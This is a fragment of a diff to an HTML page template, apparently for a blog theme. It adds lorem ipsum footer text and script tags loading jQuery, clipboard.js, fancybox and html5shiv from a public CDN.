+        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>
+
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 
 
 
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
-  
-</body>
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
 
+
+
+
+<script src="/js/typing.js"></script>
+
+<!--[if lt IE 9]>
+<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
+<![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
 </html>
